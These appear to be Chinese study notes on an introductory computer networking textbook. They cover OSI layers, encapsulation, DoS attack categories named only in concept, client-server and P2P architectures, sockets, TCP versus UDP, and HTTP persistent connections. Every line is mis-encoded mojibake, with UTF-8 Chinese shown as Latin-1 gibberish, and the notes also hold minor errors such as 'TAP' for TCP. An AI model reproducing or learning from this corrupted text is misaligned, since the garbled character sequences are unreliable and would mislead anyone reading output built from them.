OSIå‚è€ƒæ¨¡åž‹:åº”ç”¨å±‚,è¡¨ç¤ºå±‚,ä¼šè¯å±‚,è¿è¾“å±‚,ç½‘ç»œå±‚,é“¾è·¯å±‚ä¸Žç‰©ç†å±‚.è¡¨ç¤ºå±‚çš„ä½œç”¨æ˜¯ä½¿é€šä¿¡çš„åº”ç”¨ç¨‹åºèƒ½å¤Ÿè§£é‡Šäº¤æ¢æ•°æ®çš„æ„ä¹‰,æä¾›æ•°æ®åŽ‹ç¼©,æ•°æ®åŠ å¯†ä»¥åŠæ•°æ®æè¿°.ä¼šè¯å±‚æä¾›äº†æ•°æ®äº¤æ¢çš„å®šç•Œå’ŒåŒæ­¥åŠŸèƒ½,åŒ…æ‹¬å»ºç«‹æ£€æŸ¥ç‚¹å’Œæ¢å¤æ–¹æ¡ˆçš„æ–¹æ³•. 1.5.2æŠ¥æ–‡,æŠ¥æ–‡æ®µ,æ•°æ®æŠ¥å’Œå¸§æ¯ä¸€å±‚.åˆ†ç»„å…·æœ‰ä¸¤ç§ç±»åž‹çš„å­—æ®µ:é¦–éƒ¨å­—æ®µå’Œæœ‰æ•ˆè½½è·å­—æ®µ(payload field).æœ‰æ•ˆè½½è·é€šå¸¸æ¥è‡ªä¸Šä¸€å±‚çš„åˆ†ç»„. åº”ç”¨å±‚æŠ¥æ–‡+è¿è¾“å±‚é¦–éƒ¨ä¿¡æ¯-&gt;è¿è¾“å±‚æŠ¥æ–‡æ®µtransport-layer segment è¿è¾“å±‚æŠ¥æ–‡æ®µ+ç½‘ç»œå±‚é¦–éƒ¨ä¿¡æ¯-&gt;ç½‘ç»œå±‚æ•°æ®æŠ¥network-layer datagram ç½‘ç»œå±‚æ•°æ®æŠ¥+é“¾è·¯å±‚é¦–éƒ¨ä¿¡æ¯-&gt;é“¾è·¯å±‚å¸§link-layer frame 1.6æ”»å‡»å¨èƒä¸‹çš„ç½‘ç»œæ‹’ç»æœåŠ¡Denial-of-Service,DoS: å¼±ç‚¹æ”»å‡»:å‘ç›®æ ‡ä¸»æœºä¸Šè¿è¡Œçš„æ˜“å—æ”»å‡»çš„åº”ç”¨ç¨‹åºæž„é€ æŠ¥æ–‡è€Œé€ æˆæ‹’ç»æœåŠ¡. å¸¦å®½æ³›æ´ª:å‘ç›®çš„ä¸»æœºå‘é€å¤§é‡åˆ†ç»„é€ æˆæŽ¥å…¥é“¾è·¯æ‹¥å¡ž. è¿žæŽ¥æ³›æ´ª:åœ¨ç›®æ ‡ä¸»æœºä¸­åˆ›å»ºå¤§é‡çš„åŠå¼€æˆ–å…¨å¼€TCPè¿žæŽ¥ åˆ†å¸ƒå¼DoS:distributed DoS; è®°å½•æ¯ä¸ªæµç»çš„åˆ†ç»„æ‹·è´çš„è¢«åŠ¨æŽ¥æ”¶æœºè¢«ç§°ä¸ºåˆ†ç»„å—…æŽ¢å™¨. IPæ¬ºéª—(IP spoofing) ä¸­é—´äººæ”»å‡»(man-in-middle attack) 1.8Summaryæˆ‘ä»¬å·²ç»çœ‹åˆ°å„ç§æž„æˆç‰¹åˆ«çš„å› ç‰¹ç½‘å’Œæ™®é€šçš„è®¡ç®—æœºç½‘ç»œçš„ç¡¬ä»¶å’Œè½¯ä»¶. æˆ‘ä»¬ä»Žç½‘ç»œçš„è¾¹ç¼˜å¼€å§‹,è§‚å¯Ÿç«¯ç³»ç»Ÿå’Œåº”ç”¨ç¨‹åº,ä»¥åŠè¿è¡Œåœ¨ç«¯ç³»ç»Ÿä¸Šä¸ºåº”ç”¨ç¨‹åºæä¾›çš„è¿è¾“æœåŠ¡. æŽ¥ç€æˆ‘ä»¬ä¹Ÿè§‚å¯Ÿäº†æŽ¥å…¥ç½‘ä¸­å¸¸è§çš„é“¾è·¯å±‚æŠ€æœ¯å’Œç‰©ç†åª’ä½“. ç„¶åŽæˆ‘ä»¬è¿›å…¥ç½‘ç»œæ ¸å¿ƒæ›´æ·±å…¥åœ°é’»ç ”ç½‘ç»œ,æŒ‡å‡ºé€šè¿‡ç”µä¿¡ç½‘ç»œä¼ è¾“æ•°æ®çš„ä¸¤ç§åŸºæœ¬æ–¹æ³•:ç”µè·¯äº¤æ¢å’Œåˆ†ç»„äº¤æ¢,å¹¶ä¸”æŽ¢è®¨äº†æ¯ç§æ–¹æ³•çš„é•¿å¤„å’ŒçŸ­å¤„. æˆ‘ä»¬ä¹Ÿç ”ç©¶äº†å…¨çƒæ€§å› ç‰¹ç½‘çš„ç»“æž„,çŸ¥é“äº†å› ç‰¹ç½‘æ˜¯ç½‘ç»œçš„ç½‘ç»œ. æˆ‘ä»¬çœ‹åˆ°å› ç‰¹ç½‘çš„ç”±è¾ƒé«˜å±‚å’Œè¾ƒä½Žå±‚ç»„æˆçš„å±‚æ¬¡ç»“æž„,è¯¥ç½‘ç»œæ‰©å±•ä¸ºåŒ…æ‹¬æ•°ä»¥åƒè®¡çš„ç½‘ç»œ. æœ¬ç« çš„åŽåŠéƒ¨åˆ†,æˆ‘ä»¬ç ”ç©¶äº†è®¡ç®—æœºç½‘ç»œé¢†åŸŸçš„å‡ ä¸ªé‡è¦ä¸»é¢˜.é¦–å…ˆæ˜¯åˆ†ç»„äº¤æ¢ç½‘ä¸­çš„æ—¶å»¶,åžåé‡å’Œä¸¢åŒ…çš„åŽŸå› . æˆ‘ä»¬ç ”ç©¶äº†ä¼ è¾“,ä¼ æ’­å’ŒæŽ’é˜Ÿæ—¶å»¶ä»¥åŠç”¨äºŽåžåé‡çš„ç®€å•å®šé‡æ¨¡åž‹. æŽ¥ä¸‹æ¥æˆ‘ä»¬ç ”ç©¶äº†åè®®åˆ†å±‚å’ŒæœåŠ¡æ¨¡åž‹,ç½‘ç»œä¸­çš„å…³é”®ä½“ç³»ç»“æž„åŽŸåˆ™. æˆ‘ä»¬è¿˜æ¦‚è¿°äº†å½“ä»Šå› ç‰¹ç½‘ä¸­ä¸€äº›æµè¡Œçš„å®‰å…¨æ”»å‡»,å¹¶ä»¥è®¡ç®—æœºç½‘ç»œçš„ç®€è¦åŽ†å²ç»“æŸ. 2åº”ç”¨å±‚åœ¨æœ¬ç« ä¸­,æˆ‘ä»¬å­¦ä¹ æœ‰å…³ç½‘ç»œåº”ç”¨çš„åŽŸç†å’Œå®žçŽ°æ–¹é¢çš„çŸ¥è¯†.æˆ‘ä»¬ä»Žå®šä¹‰å‡ ä¸ªå…³é”®å­—çš„åº”ç”¨å±‚æ¦‚å¿µå¼€å§‹,å…¶ä¸­åŒ…æ‹¬åº”ç”¨ç¨‹åºæ‰€éœ€è¦çš„ç½‘ç»œæœåŠ¡,å®¢æˆ·æœºå’ŒæœåŠ¡å™¨,è¿›ç¨‹å’Œè¿è¾“å±‚æŽ¥å£.ç„¶åŽè¯¦ç»†è®¨è®ºå‡ ç§ç½‘ç»œåº”ç”¨ç¨‹åºåŒ…æ‹¬web,email,DNS,å¯¹ç­‰æ–‡ä»¶åˆ†å‘å’ŒP2På› ç‰¹ç½‘ç”µè¯.æŽ¥ä¸‹æ¥å°†æŽ¢è®¨å¼€å‘è¿è¡Œåœ¨TCPå’ŒUDPä¸Šçš„ç½‘ç»œåº”ç”¨ç¨‹åºçš„æ–¹æ³•,ç‰¹åˆ«æ˜¯å­¦ä¹ å¥—æŽ¥å­—API,å¹¶æ¦‚è¦å­¦ä¹ ç”¨Javaå®žçŽ°çš„å‡ ä¸ªç®€å•å®¢æˆ·æœº/æœåŠ¡å™¨åº”ç”¨. 2.1åº”ç”¨å±‚åè®®åŽŸç† åœ¨ç ”å‘æ–°çš„åº”ç”¨æ—¶,å¹¶ä¸éœ€è¦è€ƒè™‘ä¸åŒç«¯ç³»ç»Ÿä¹‹é—´çš„é€šä¿¡é—®é¢˜.å› ä¸ºç½‘ç»œæ ¸å¿ƒè®¾å¤‡å¹¶ä¸åœ¨åº”ç”¨å±‚èµ·ä½œç”¨,è€Œæ˜¯åœ¨è¾ƒä½Žå±‚èµ·ä½œç”¨.å…·ä½“æ¥è¯´å°±æ˜¯ç½‘ç»œå±‚åŠä¸‹é¢å±‚æ¬¡.è¿™ç§å°†åº”ç”¨è½¯ä»¶é™åˆ¶åœ¨ç«¯ç³»ç»Ÿçš„åŸºæœ¬è®¾è®¡æ–¹æ³•,ä¿ƒè¿›äº†å¤§é‡çš„å› ç‰¹ç½‘åº”ç”¨ç¨‹åºçš„ç ”å‘ä¸Žéƒ¨ç½².(ç®€å•æ¥è¯´å°±æ˜¯ä¸ç”¨å…³å¿ƒåº•å±‚çš„äº‹æƒ…äº†). 2.1.1ç½‘ç»œåº”ç”¨ç¨‹åºä½“ç³»ç»“æž„åº”ç”¨ç¨‹åºçš„ä½“ç³»ç»“æž„æ˜Žæ˜¾ä¸åŒäºŽç½‘ç»œçš„ä½“ç³»ç»“æž„.åº”ç”¨ç¨‹åºä½“ç³»ç»“æž„ç”±å¼€å‘è€…è®¾è®¡,è§„å®šäº†å¦‚ä½•åœ¨å„ç§ç«¯ç³»ç»Ÿä¸Šç»„ç»‡è¯¥åº”ç”¨ç¨‹åº.åœ¨é€‰æ‹©åº”ç”¨ç¨‹åºä½“ç³»ç»“æž„æ—¶,åº”ç”¨ç¨‹åºç ”å‘è€…å¾ˆå‘åˆ©ç”¨çŽ°ä»£ç½‘ç»œåº”ç”¨ç¨‹åºä¸­æ‰€ä½¿ç”¨çš„ä¸¤ç§ä¸»æµä½“ç³»ç»“æž„ä¹‹ä¸€:å®¢æˆ·æœº/æœåŠ¡å™¨ä½“ç³»ç»“æž„æˆ–å¯¹ç­‰ä½“ç³»ç»“æž„. In client-server architecture,æœ‰ä¸€ä¸ªæ€»æ˜¯æ‰“å¼€çš„ä¸»æœºç§°ä¹‹ä¸ºæœåŠ¡å™¨,æœåŠ¡æ¥è‡ªå®¢æˆ·æœºçš„è¯·æ±‚.ä¸¤ä¸ªç‰¹å¾:è¯¥ä½“ç³»ç»“æž„å®¢æˆ·æœºä¹‹é—´ä¸ç›´æŽ¥é€šä¿¡.æœåŠ¡å™¨å…·æœ‰å›ºå®šçš„,å‘¨çŸ¥çš„IPåœ°å€.è¯¥ä½“ç³»ç»“æž„å¸¸è§çš„åº”ç”¨ç¨‹åºåŒ…æ‹¬web,FTP,Telnet.Email.è¯¥ä½“ç³»ç»“æž„å¸¸ç”¨ä¸»æœºé›†ç¾¤/æœåŠ¡å™¨åœº(server farm)åˆ›å»ºå¼ºå¤§çš„è™šæ‹ŸæœåŠ¡å™¨.åŸºäºŽå®¢æˆ·æœº/æœåŠ¡å™¨ä½“ç³»ç»“æž„çš„åº”ç”¨æœåŠ¡é€šå¸¸æ˜¯åŸºç¡€è®¾æ–½å¯†é›†(infrastructure intensive)çš„,å› ä¸ºå®ƒä»¬è¦æ±‚æœåŠ¡æä¾›å•†è´­ä¹°å®‰è£…ç»´æŠ¤æœåŠ¡å™¨åœº. In peer-to-peer architecture,å¯¹æ€»æ˜¯æ‰“å¼€çš„åŸºç¡€è®¾æ–½æœåŠ¡å™¨æœ‰æœ€å°çš„ä¾èµ–,å¹¶ä¸”ç›´æŽ¥ç›¸äº’é€šä¿¡.ç›®å‰å¤§å¤šæ•°æµé‡å¯†é›†åž‹åº”ç”¨ç¨‹åºéƒ½æ˜¯P2Pä½“ç³»ç»“æž„çš„.åŒ…æ‹¬æ–‡ä»¶åˆ†å‘BitTorrent,æ–‡ä»¶æœç´¢/å…±äº«,å› ç‰¹ç½‘ç”µè¯skype.P2Pä½“ç³»ç»“æž„æœ€çªå‡ºçš„ç‰¹æ€§ä¹‹ä¸€æ˜¯å®ƒçš„è‡ªæ‰©å±•æ€§self-scalability.å¦‚åœ¨ä¸€ä¸ªp2på…±äº«æ–‡ä»¶åº”ç”¨ä¸­,æ¯ä¸ªå¯¹ç­‰æ–¹éƒ½å› è¯·æ±‚æ–‡ä»¶äº§ç”Ÿè´Ÿè½½,ä½†æ˜¯æ¯ä¸ªå¯¹ç­‰æ–¹å‘å…¶ä»–å¯¹ç­‰æ–¹åˆ†å‘æ–‡ä»¶ä¹Ÿä¸ºç³»ç»Ÿå¢žåŠ äº†æœåŠ¡èƒ½åŠ›(æ²¡æ€Žä¹ˆå¬æ‡‚å•¥æ„æ€.),æˆæœ¬æœ‰æ•ˆ,å› ä¸ºä¸éœ€è¦åºžå¤§çš„æœåŠ¡å™¨åŸºç¡€è®¾æ–½å’ŒæœåŠ¡å™¨å¸¦å®½.å¦ä¸€æ–¹é¢,é«˜å¼€æ”¾ä¸Žé«˜åº¦åˆ†å¸ƒæ€§è´¨éœ€è¦æ ¼å¤–å…³æ³¨ç³»ç»Ÿå®‰å…¨. 2.1.2è¿›ç¨‹é€šä¿¡ åœ¨æ“ä½œç³»ç»Ÿæœ¯è¯­ä¸­,è¿›è¡Œé€šä¿¡çš„æ˜¯è¿›ç¨‹processè€Œéžç¨‹åº,è¿›ç¨‹å¯ä»¥è®¤ä¸ºæ˜¯è¿è¡Œåœ¨ç«¯ç³»ç»Ÿä¸­çš„ç¨‹åº. åœ¨ç›¸åŒç«¯ç³»ç»Ÿä¸Šçš„è¿›ç¨‹é€šä¿¡ç”±æ“ä½œç³»ç»Ÿæœ¬èº«è§„å®š. ä¸åŒç«¯ç³»ç»Ÿä¸Šçš„è¿›ç¨‹è·¨è¶Šè®¡ç®—æœºç½‘ç»œäº¤æ¢æŠ¥æ–‡messageè€Œé€šä¿¡.å‘é€è¿›ç¨‹åˆ›å»ºå¹¶å‘ç½‘ç»œä¸­å‘é€æŠ¥æ–‡,æŽ¥æ”¶è¿›ç¨‹æŽ¥æ”¶è¿™äº›æŠ¥æ–‡,å¯èƒ½è´Ÿè´£å›žé€æŠ¥æ–‡. åœ¨ç»™å®šçš„ä¸€å¯¹è¿›ç¨‹ä¹‹é—´çš„é€šä¿¡ä¼šè¯ä¸­,å‘èµ·é€šä¿¡çš„è¿›ç¨‹è¢«æ ‡ç¤ºä¸ºå®¢æˆ·æœº,åœ¨ç»˜ç”»å¼€å§‹æ—¶ç­‰å¾…è”ç³»çš„è¿›ç¨‹æ˜¯æœåŠ¡å™¨. è¿›ç¨‹é€šè¿‡ä¸€ä¸ªç§°ä¸ºå¥—æŽ¥å­—socketçš„è½¯ä»¶æŽ¥å£åœ¨ç½‘ç»œä¸Šå‘é€å’ŒæŽ¥æ”¶æŠ¥æ–‡,å¥—æŽ¥å­—æ˜¯åŒä¸€å°ä¸»æœºå†…åº”ç”¨å±‚ä¸Žè¿è¾“å±‚ä¹‹é—´çš„æŽ¥å£,ç”±äºŽå…¶æ˜¯åœ¨ç½‘ç»œä¸Šå»ºç«‹ç½‘ç»œåº”ç”¨ç¨‹åºçš„å¯ç¼–ç¨‹æŽ¥å£,å› æ­¤ä¹Ÿç§°ä¸ºåº”ç”¨ç¨‹åºå’Œç½‘ç»œä¹‹é—´çš„åº”ç”¨ç¨‹åºç¼–ç¨‹æŽ¥å£(Application Programming Interface).åº”ç”¨ç¨‹åºå¼€å‘è€…å¯ä»¥æŽ§åˆ¶å¥—æŽ¥å­—åœ¨åº”ç”¨å±‚ç«¯çš„æ‰€æœ‰,ä½†å¯¹äºŽè¿è¾“å±‚ç«¯åªé™äºŽé€‰æ‹©è¿è¾“å±‚åè®®ä¸Žè®¾å®šå‡ ä¸ªè¿è¾“å±‚å‚æ•°. åŒ…æ‹¬å› ç‰¹ç½‘åœ¨å†…çš„å¾ˆå¤šç½‘ç»œæä¾›äº†ä¸æ­¢ä¸€ç§è¿è¾“å±‚åè®®,å¼€å‘ä¸€ä¸ªåº”ç”¨æ—¶,æ ¹æ®å¯ç”¨çš„è¿è¾“å±‚åè®®æ‰€æä¾›çš„æœåŠ¡,é€‰æ‹©ä¸€ä¸ªä¸ºåº”ç”¨æä¾›æ°å½“æœåŠ¡çš„åè®®. å¯¹åº”ç”¨ç¨‹åºçš„æœåŠ¡è¦æ±‚è¿›è¡Œåˆ†ç±»:å¯é æ•°æ®ä¼ è¾“,åžåé‡,å®šæ—¶ä¸Žå®‰å…¨æ€§. reliable data transfer,å¯¹æ•°æ®æœ‰æžé«˜è¦æ±‚çš„æƒ…å†µä¸‹,å¿…é¡»ç¡®ä¿åº”ç”¨ç¨‹åºä¸€ç«¯å‘é€çš„æ•°æ®æ­£ç¡®,å®Œæ•´åœ°äº¤ä»˜ç»™åº”ç”¨ç¨‹åºå¦ä¸€ç«¯.å¯¹äºŽå®¹å¿ä¸¢å¤±çš„åº”ç”¨,loss-tolerant applicationæ¥ä¹¦è¯„ä¸æä¾›å¯é æ•°æ®ä¼ è¾“çš„è¿è¾“å±‚åè®®ä¹Ÿæ˜¯å¯ä»¥æŽ¥å—çš„.(å¦‚å¤šåª’ä½“åº”ç”¨) ä¸¤ä¸ªè¿›ç¨‹åœ¨ä¸€æ¡ç½‘ç»œè·¯å¾„ä¸Šè¿›è¡Œé€šä¿¡ä¼šè¯æ—¶,å¯ç”¨åžåé‡å°±æ˜¯å‘é€è¿›ç¨‹èƒ½å¤Ÿå‘æŽ¥æ”¶è¿›ç¨‹äº¤ä»˜æ¯”ç‰¹çš„é€ŸçŽ‡.å› ä¸ºå…¶ä»–ä¼šè¯å°†æ²¿ç€è¯¥ç½‘ç»œè·¯å¾„ä¸Šçš„å¸¦å®½,å¹¶ä¸”è¿™äº›å…¶ä»–ä¼šè¯å°†ä¼šåˆ°è¾¾ä¸Žç¦»å¼€,æ‰€ä»¥å¯ç”¨åžåé‡å°†éšæ—¶é—´æ³¢åŠ¨.ç¡®ä¿åžåé‡çš„æœåŠ¡å¯¹äºŽå¤§éƒ¨åˆ†åº”ç”¨ç¨‹åºæœ‰ç€å¸å¼•åŠ›,å…·æœ‰åžåé‡è¦æ±‚çš„åº”ç”¨ç¨‹åºç§°ä¸ºå¸¦å®½æ•æ„Ÿçš„åº”ç”¨(bandwith-sensitive application).è€Œå¼¹æ€§åº”ç”¨elastic applicationèƒ½å¤Ÿæ ¹æ®éœ€è¦å……åˆ†åˆ©ç”¨å¯ä»¥ä½¿ç”¨çš„åžåé‡. å®šæ—¶ä¿è¯,å¯ä»¥ä»¥å¤šç§å½¢å¼å®žçŽ°,ä¾‹å¦‚è®¾ç½®å‘é€æ–¹æ³¨å…¥è¿›å¥—æŽ¥å­—ä¸­çš„æ¯ä¸ªbitåˆ°è¾¾æŽ¥æ”¶æ–¹å¥—æŽ¥å­—ä¸è¿ŸäºŽ100ms,å¯¹äºŽäº¤äº’å¼å®žæ—¶åº”ç”¨ç¨‹åºéžå¸¸é€‚ç”¨.(ç½‘ç»œä¼šè®®,æ¸¸æˆ). è¿è¾“å±‚åè®®ä¸ºåº”ç”¨ç¨‹åºæä¾›ä¸€ç§æˆ–å¤šç§å®‰å…¨æ€§æœåŠ¡,å¦‚åŠ å¯†å‘é€è¿›ç¨‹ä¼ é€’çš„æ‰€æœ‰æ•°æ®,å¹¶åœ¨æŽ¥æ”¶è¿›ç¨‹æŽ¥æ”¶å‰è§£å¯†.è¿™ç§æœåŠ¡å¯¹å‘é€è¿›ç¨‹ä¸ŽæŽ¥æ”¶è¿›ç¨‹ä¿å¯†,é˜²æ­¢å…¶ä»¥æŸç§æ–¹å¼è§‚å¯Ÿåˆ°æ•°æ®.é™¤äº†æœºå¯†æ€§ä¹‹å¤–çš„å®‰å…¨æœåŠ¡:æ•°æ®å®Œæ•´æ€§å’Œç«¯ç‚¹é‰´åˆ«. 2.1.4å› ç‰¹ç½‘æä¾›çš„è¿è¾“æœåŠ¡ TCPæœåŠ¡æ¨¡åž‹åŒ…æ‹¬é¢å‘è¿žæŽ¥æœåŠ¡å’Œå¯é æ•°æ®ä¼ è¾“æœåŠ¡. é¢å‘è¿žæŽ¥æœåŠ¡:åœ¨åº”ç”¨å±‚æ•°æ®æŠ¥æ–‡å¼€å§‹æµåŠ¨ä¹‹å‰,å®¢æˆ·æœºç¨‹åºå’ŒæœåŠ¡å™¨ç¨‹åºä¹‹é—´ç›¸äº’äº¤æ¢è¿è¾“å±‚æŽ§åˆ¶ä¿¡æ¯.TCPçš„ä¸‰æ¬¡æ¡æ‰‹æç¤ºå®¢æˆ·æœºå’ŒæœåŠ¡å™¨åšå¥½ä¼ è¾“åˆ†ç»„çš„å‡†å¤‡.æ¡æ‰‹é˜¶æ®µä¹‹åŽ,å°±åœ¨ä¸¤ä¸ªè¿›ç¨‹çš„å¥—æŽ¥å­—ä¹‹é—´å»ºç«‹äº†ä¸€ä¸ªTCPè¿žæŽ¥.è¿™ä¸ªè¿žæŽ¥æ˜¯å…¨åŒå·¥çš„:è¿žæŽ¥åŒæ–¹çš„è¿›ç¨‹å¯ä»¥åœ¨æ­¤è¿žæŽ¥ä¸ŠåŒæ—¶è¿›è¡ŒæŠ¥æ–‡æ”¶å‘.ç»“æŸæŠ¥æ–‡å‘é€æ—¶,å°†æ‹†é™¤è¯¥è¿žæŽ¥.ç§°ä¹‹ä¸ºé¢å‘è¿žæŽ¥çš„æœåŠ¡,è€Œéžè¿žæŽ¥æœåŠ¡,æ˜¯å› ä¸ºä¸¤ä¸ªè¿›ç¨‹ä¹‹é—´æ˜¯ä»¥ä¸€ç§éžå¸¸æ¾æ•£çš„æ–¹å¼è¿›è¡Œè¿žæŽ¥çš„. å¯é æ•°æ®ä¼ è¾“æœåŠ¡:ä¾é TCPåè®®è¿›ç¨‹é€šä¿¡æ—¶,æ•°æ®æ˜¯æ— å·®é”™,æŒ‰é€‚å½“é¡ºåºè¿›è¡Œäº¤ä»˜çš„. TCPåè®®è¿˜å…·æœ‰æ‹¥å¡žæŽ§åˆ¶æœºåˆ¶.ç½‘ç»œå‡ºçŽ°æ‹¥å¡ž,è¯¥æœºåˆ¶ä¼šæŠ‘åˆ¶æºçš„å‘é€è¿›ç¨‹. TCPçš„åŠ å¼ºç‰ˆæœ¬:Secure Scoket Layerå³SSL.èƒ½å¤Ÿåœ¨TCPåŸºç¡€ä¸Šæä¾›å…³é”®çš„è¿›ç¨‹åˆ°è¿›ç¨‹çš„å®‰å…¨æ€§æœåŠ¡.åŒ…æ‹¬åŠ å¯†,æ•°æ®å®Œæ•´æ€§ä»¥åŠç«¯ç‚¹é‰´åˆ«.SSLæ˜¯åœ¨åº”ç”¨å±‚å®žçŽ°çš„,ä½¿ç”¨SSLæœåŠ¡æ—¶æŠŠSSLçš„ä»£ç åŒ…å«è¿›åŽ»å³å¯. UDPä¸æä¾›ä¸å¿…è¦æœåŠ¡çš„è½»é‡çº§è¿è¾“å±‚åè®®,ä»…æä¾›æœ€å°æœåŠ¡.æ— è¿žæŽ¥(ä¼ è¾“ä¹‹å‰æ— æ¡æ‰‹è¿‡ç¨‹).æ— æ‹¥å¡žæœºåˆ¶.ä¸å¯é æ•°æ®ä¼ è¾“æœåŠ¡:UDPåè®®ä¸ä¿è¯æŠ¥æ–‡èƒ½è¢«æŽ¥æ”¶è¿›ç¨‹æŽ¥æ”¶åˆ°,å¹¶ä¸”åˆ°è¾¾çš„æŠ¥æ–‡è¿˜å¯èƒ½æ˜¯ä¹±åºçš„. åœ¨å¯¹TCPä¸ŽUDPçš„æè¿°ä¸­,ç¼ºå°‘å¯¹å®šæ—¶ä¿è¯å’Œåžåé‡çš„æè¿°,å› ä¸ºç›®å‰çš„å› ç‰¹ç½‘è¿è¾“å±‚åè®®å¹¶æœªæä¾›è¿™ä¸¤ç§æœåŠ¡,åªèƒ½åœ¨è®¾è®¡ä¸­å•ç‹¬å®žçŽ°. è¿›ç¨‹å¯»å€:ä¸ºäº†è¯†åˆ«æŽ¥æ”¶è¿›ç¨‹,éœ€è¦çŸ¥é“è¯¥ä¸»æœºçš„åç§°æˆ–è€…åœ°å€,ä»¥åŠç”¨æ¥æŒ‡å®šç›®çš„ä¸»æœºä¸ŠæŽ¥æ”¶è¿›ç¨‹çš„æ ‡è¯†.IPåœ°å€å’Œç«¯å£å·å®žçŽ°è¯¥åŠŸèƒ½. webæœåŠ¡è¿›ç¨‹ä½¿ç”¨çš„æ˜¯80å·ç«¯å£,é‚®ä»¶æœåŠ¡è¿›ç¨‹SMTPä½¿ç”¨çš„25å·ç«¯å£. 2.1.5åº”ç”¨å±‚åè®®åº”ç”¨å±‚åè®®å®šä¹‰äº†è¿è¡Œåœ¨ä¸åŒç«¯ç³»ç»Ÿä¸Šçš„åº”ç”¨ç¨‹åºå¦‚ä½•ç›¸äº’ä¼ é€’æŠ¥æ–‡,ç‰¹åˆ«æ˜¯å®šä¹‰äº†:äº¤æ¢çš„æŠ¥æ–‡ç±»åž‹,å¦‚è¯·æ±‚æŠ¥æ–‡ä¸Žå“åº”æŠ¥æ–‡.å„ç§æŠ¥æ–‡ç±»åž‹çš„è¯­æ³•,å¦‚æŠ¥æ–‡ä¸­å„å­—æ®µåŠè¯¦ç»†æè¿°.å­—æ®µè¯­ä¹‰,åŠåŒ…å«åœ¨å­—æ®µä¸­çš„ä¿¡æ¯çš„å«ä¹‰.è¿›ç¨‹ä½•æ—¶/å¦‚ä½•å‘é€æŠ¥æ–‡å¹¶å¯¹æŠ¥æ–‡è¿›è¡Œå“åº”çš„è§„åˆ™. 2.2webåº”ç”¨å’ŒHTTPæœåŠ¡2.2.1HTTPæ¦‚å†µ webçš„åº•å±‚åè®®æ˜¯è¶…æ–‡æœ¬ä¼ è¾“åè®®HTTP,æ˜¯webçš„æ ¸å¿ƒ. HTTPåè®®ç”±ä¸¤éƒ¨åˆ†å®žçŽ°:ä¸€ä¸ªå®¢æˆ·æœºç¨‹åºä¸€ä¸ªæœåŠ¡å™¨ç¨‹åº,è¿è¡Œåœ¨ä¸åŒçš„ç«¯ç³»ç»Ÿä¸­,äº¤æ¢HTTPæŠ¥æ–‡æ¥è¿›è¡Œä¼šè¯. webé¡µé¢ç”±å¯¹è±¡ç»„æˆ,å¯¹è±¡å³æ–‡ä»¶.å¤šæ•°webé¡µé¢æœ‰ä¸€ä¸ªåŸºæœ¬HTMLæ–‡ä»¶ä»¥åŠå‡ ä¸ªå¼•ç”¨å¯¹è±¡. æ¯ä¸ªURLåœ°å€ç”±ä¸¤éƒ¨åˆ†ç»„æˆ:å­˜æ”¾å¯¹è±¡çš„æœåŠ¡å™¨ä¸»æœºåå’Œå¯¹è±¡çš„è·¯å¾„å. HTTPä½¿ç”¨TAPä½œä¸ºå…¶æ”¯æ’‘è¿è¾“å±‚åè®®. HTTPæ˜¯ä¸€ä¸ªæ— çŠ¶æ€åè®®,æœåŠ¡å™¨è¿”å›žçš„æŠ¥æ–‡å¹¶ä¸åŒ…å«å…³äºŽå®¢æˆ·æœºçš„çŠ¶æ€ç‰¹å¾,æ‰€ä»¥ç«‹å³å†æ¬¡è¯·æ±‚ä¹Ÿä¼šå†æ¬¡å“åº”. 2.2.2éžæŒä¹…è¿žæŽ¥ä¸ŽæŒä¹…è¿žæŽ¥å®¢æˆ·æœºä¸ŽæœåŠ¡å™¨è¿›è¡Œé•¿æ—¶é—´é€šä¿¡æ—¶,å®¢æˆ·æœºå‘å‡ºä¸€ç³»åˆ—è¯·æ±‚,æœåŠ¡å™¨å¯¹æ¯ä¸ªè¯·æ±‚è¿›è¡Œå“åº”.è¿™ä¸€ç³»åˆ—è¯·æ±‚å¯ä»¥é€ä¸ªå‘å‡º,ä¹Ÿå¯ä»¥é—´æ–­å‘å‡º.å½“äº¤äº’è¿è¡ŒäºŽTCPåè®®ä¸Šæ—¶,åº”ç”¨ç¨‹åºç ”åˆ¶è€…è¦ç¡®å®šæ¯ä¸ªè¯·æ±‚.å“åº”å¯¹æ˜¯ç»ä¸€ä¸ªå•ç‹¬çš„TCPè¿žæŽ¥å‘é€(éžæŒä¹…è¿žæŽ¥),è¿˜æ˜¯æ‰€æœ‰çš„è¯·æ±‚/å“åº”ç»ç›¸åŒçš„TCPè¿žæŽ¥å‘é€(æŒä¹…è¿žæŽ¥). é»˜è®¤æ–¹å¼ä¸‹HTTPä½¿ç”¨æŒä¹…è¿žæŽ¥; è¯·æ±‚æ˜¯å¯¹äºŽå¯¹è±¡è€Œè¨€çš„,TCPè¿žæŽ¥ä¹Ÿæ˜¯å¯¹äºŽè¯·æ±‚è€Œè¨€çš„,è€Œä¸æ˜¯ä¸€ä¸ªè¯·æ±‚å¯¹åº”æ•´ä¸ªHTMLé¡µé¢ä»¥åŠå…¶ä¸­çš„å¯¹è±¡.å¯¹äºŽéžæŒä¹…è¿žæŽ¥,æœ‰nä¸ªå¯¹è±¡åˆ™éœ€è¯·æ±‚næ¬¡,å»ºç«‹nä¸ªTCPè¿žæŽ¥. TCPè¿˜æœ‰ä¸²è¡Œå’Œå¹¶è¡Œä¹‹åˆ†,ç”¨æˆ·å¯ä»¥è®¾ç½®æµè§ˆå™¨æ¥æŽ§åˆ¶å¹¶è¡Œåº¦. å¾€è¿”æ—¶é—´(Round-Trip Time,RTT),å³ä¸€ä¸ªå°åˆ†ç»„ä»Žå®¢æˆ·åŠåˆ°æœåŠ¡å™¨å†è¿”å›žåˆ°å®¢æˆ·æœºæ‰€èŠ±çš„æ—¶é—´. RTTåŒ…æ‹¬åˆ†ç»„ä¼ æ’­æ—¶å»¶,åˆ†ç»„åœ¨ä¸­é—´è·¯ç”±å™¨å’Œäº¤æ¢æœºä¸Šçš„æŽ’é˜Ÿæ—¶å»¶ä»¥åŠåˆ†ç»„å¤„ç†æ—¶å»¶. 